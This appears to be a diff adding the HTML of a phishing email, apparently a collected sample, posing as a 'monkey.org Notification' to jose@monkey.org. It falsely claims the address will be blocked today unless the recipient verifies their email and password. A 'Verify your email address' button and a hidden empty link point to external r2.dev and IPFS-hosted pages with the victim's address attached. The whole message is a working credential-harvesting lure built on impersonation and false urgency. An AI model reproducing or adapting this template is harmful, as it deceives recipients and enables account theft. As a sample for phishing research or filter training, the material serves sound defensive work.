@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+
+<html><head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+</head>
+
+<body style="color: rgb(255, 0, 0); background-color: rgb(255, 255, 255);">
+    <div class="v1v1js-helper v1v1js-readmsg-msg"><u>&nbsp;</u>
+        <div class="v1v1cl_133802"><u>&nbsp;</u>
+            <table style="border: 1px solid rgb(223, 223, 223); border-image: none; width: 697px; color: rgb(102, 102, 102); line-height: normal; font-family: arial; font-size: 15px; font-stretch: normal; font-variant-numeric: normal; font-variant-east-asian: normal;" cellspacing="0" cellpadding="0">
+                <tbody>
+                    <tr>
+                        <td style="padding: 8px 20px; border: 1px dotted rgb(211, 211, 211); border-image: none; color: rgb(204, 204, 204); font-family: times; font-size: 20px; background-color: rgb(45, 45, 45);"><span style="color: rgb(255, 255, 255);"><strong>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;monkey.org Notification - ID#220132819</strong></span></td>
+                    </tr>
+                    <tr>
+                        <td valign="top" style="padding: 20px 20px 0px; border: 1px dotted rgb(211, 211, 211); border-image: none;"><br></td>
+                    </tr>
+                    <tr>
+                        <td style="padding: 0px 20px 20px; border: 1px dotted rgb(211, 211, 211); border-image: none;">
+                            <div style="margin: 0px; padding: 20px; border: 1px solid rgb(242, 242, 242); border-image: none; font-family: inherit; vertical-align: baseline;"><span style="color: rgb(0, 0, 255);"><span style="font-size: medium;"><span style="border-width: 0px; margin: 0px; padding: 0px; font-family: inherit; vertical-align: baseline;"><span style="font-size: 10pt;"><strong><span style="font-size: 10pt;"><span style="font-size: 10pt;">
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; <span style="font-size: 14pt;"><font color="#0047ab"><span style="font-size: 17pt;"><span style="font-size: 19pt;">jose@monkey.org</span></span></font></span></span></span></strong></span></span></span></span></div><span style="color: rgb(0, 0, 255);"><span style="font-size: medium;">
+<span style="border-width: 0px; margin: 0px; padding: 0px; font-family: inherit; vertical-align: baseline;">
+                                        <p style="margin: 0px; padding: 20px; border: 1px solid rgb(242, 242, 242); border-image: none; color: rgb(34, 34, 34); text-transform: none; text-indent: 0px; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-size: small; font-style: normal; word-spacing: 0px; vertical-align: baseline; white-space: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal; 
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;"><span style="font-size: 10pt;"><span style="font-size: 10pt;"><span style="font-size: 10pt;"><span style="font-size: 11pt;">Your Email address&nbsp;</span></span><span style="font-size: 10pt;"><span style="font-size: 10pt;"><span style="font-size: 10pt;"><span style="font-size: 11pt;">
+will be blocked/removed today!!! You need to verify your primary E-mail/Password&nbsp;to continue using your account.</span></span></span></span><br><br><span style="font-size: 10pt;"><span style="font-size: 10pt;"><span style="font-size: 11pt;">We encourage you to take time now to maintain your account activities to avoid login interruption or&nbsp;</span><span style="font-size: 10pt;"><span style="font-size: 10pt;"><span style="font-size: 11pt;">losing your account permanently.</span></span>
+</span></span></span></span></span><span style="font-size: 10pt;"><span style="color: rgb(0, 0, 0); font-family: inherit; font-size: medium;"><span style="color: rgb(0, 0, 255);">&nbsp;<span style="font-size: 10pt;"><br><strong>&nbsp;</strong></span></span></span></span></p>
+                                    </span></span></span>
+                            <div align="center" style="margin: 0px; padding: 20px; border: 1px solid rgb(242, 242, 242); border-image: none; font-family: inherit; vertical-align: baseline;"><span style="color: rgb(0, 0, 255);"><span style="font-size: medium;"><span style="border-width: 0px; margin: 0px; padding: 0px; font-family: inherit; vertical-align: baseline;"><strong>
+&nbsp;<a style="text-decoration: none;" href="https://bafybeic3gobocsljjp2gyvbm3lzklodnukl7is5dqohowg3fvjtxovtv6m.ipfs.w3s.link/wanRDRneededfiles6867.html#jose@monkey.org">&nbsp;</a><a style="text-decoration: none;" href="https://pub-535d7aceb2cc484d95ead7d976aa6005.r2.dev/siru.html#jose@monkey.org">
+<span style="padding: 5px 7px; border-radius: 8px; border: 1px solid rgb(8, 44, 64); border-image: none; text-align: center; color: rgb(255, 255, 255); line-height: 2em; letter-spacing: 2px; font-size: 24px; font-weight: bold; position: relative; cursor: pointer; text-shadow: 1px 1px 1px rgba(5,29,41,1); background-color: rgb(15, 82, 186); -webkit-touch-callout: none; -webkit-user-select: all; -khtml-user-select: all; -moz-user-select: all; user-select: all;">Verify your email address</span></a>
+</strong></span></span></span></div>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td style="padding: 10px 20px; border: 1px dotted rgb(211, 211, 211); border-image: none; background-color: rgb(242, 242, 242);">
+                            <div class="v1form"><span style="font-family: Calibri;"><span style="font-size: 11pt;"><font color="#c40000"><strong><span style="font-size: 10pt;"><span style="font-size: 13pt;"><span style="font-size: 12pt;">Note:&nbsp;</span></span></span></strong><span style="font-size: 10pt;"><span style="font-size: 13pt;"><span style="font-size: 12pt;">We will not be held responsible for any account loss.&nbsp;Please do not reply to this email.</span></span></span><strong>
+<span style="font-size: 10pt;">&nbsp;</span></strong></font></span></span></div>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td style="padding: 10px 20px; border: 1px dotted rgb(211, 211, 211); border-image: none; font-size: 11px;"><font color="#000000"><span style="font-size: 9pt;">&nbsp;</span><br><span style="font-size: 9pt;">&nbsp;</span><span style='font-family: "Open Sans", sans-serif; font-size: 10px;'><span class="v1v1gmail_default" style='font-family: "trebuchet ms", sans-serif;'><span style="font-size: 9pt;">&copy;</span><strong><span style="font-size: 9pt;">2023</span></strong>
+<span style="font-size: 9pt;"> </span><strong><span style="font-size: 9pt;">&nbsp;monkey.org</span></strong></span></span><span style="font-size: 9pt;"> </span><span style='font-family: "Open Sans", sans-serif; font-size: 10px;'><span style="font-size: 9pt;">&nbsp;Account and Services. All rights reserved Web App Support.</span><span style="color: rgb(0, 0, 255);"><span style="color: rgb(0, 0, 0);"></span></span></span></font><span style="color: rgb(0, 0, 255);">
+<span style="color: rgb(0, 0, 0);"></span></span><span style="color: rgb(0, 0, 0);"></span></td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+    <p><br></p>
+    <div class="v1v1js-helper v1v1js-readmsg-msg">
+        <div class="v1v1cl_133802">&nbsp;</div>
+    </div>
+    <p><br></p>
+    <div class="v1v1js-helper v1v1js-readmsg-msg">
+        <div class="v1v1cl_133802">
+            <p>&nbsp;</p>
+        </div>
+    </div>
+    <p><br></p>
+    <table width="100%" style="margin: 0px; padding: 0px; color: rgb(34, 34, 34); text-transform: none; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-size: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal; border-collapse: collapse; table-layout: auto !important; border-spacing: 0px; orphans: 2; widows: 2; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; 
+text-decoration-style: initial; text-decoration-color: initial;" bgcolor="#f4f4f4" border="0" cellspacing="0" cellpadding="0">
+        <tbody>
+            <tr>
+                <td align="left" valign="top" style="margin: 0px; padding: 0px; width: 924px; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif;">&nbsp;</td>
+            </tr>
+        </tbody>
+    </table>
+
+
+</body></html>
